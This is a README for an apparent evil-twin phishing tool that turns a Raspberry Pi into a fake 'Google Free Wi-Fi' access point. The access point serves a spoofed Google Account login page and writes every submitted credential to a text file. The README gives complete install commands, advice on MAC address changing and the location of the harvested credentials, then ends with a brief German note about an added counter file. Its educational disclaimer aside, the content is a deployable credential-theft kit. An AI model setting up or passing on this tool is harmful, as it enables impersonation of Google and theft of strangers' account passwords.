# A rogue captive portal for Raspberry Pi

This is a simple website and set of configuration files that turns a Raspberry Pi Zero W (or other Pi with WiFi) into a rogue access point named "Google Free Wi-Fi." It spoofs a captive portal that looks like the Google Account login page, however authentication always fails and the credentials are logged to a text file.

It was designed to demonstrate the simplicity of offline credential grabbing and to educate about wireless security. Using this for malicious purposes is against the author's intent and could lead to prosecution under privacy laws.

Installation after a fresh install of Raspbian Buster Lite:
```
sudo apt update
sudo apt install git
git clone https://github.com/braindead-sec/rogue-captive
cd rogue-captive
chmod +x install.sh
sudo ./install.sh
sudo reboot
```
During installation, macchanger will ask whether or not MAC addresses should be changed automatically - choose "No". The startup script in rc.local will perform this task more reliably.

After reboot, look for an access point named "Google Free Wi-Fi." Connecting to it from any device should automatically bring up a captive portal login screen.

Credentials are logged in `/var/www/html/creds.txt`.

# Notiz

Habe einen Counter hinzugefügt, der in `/var/www/html/counter.txt` schreibt.
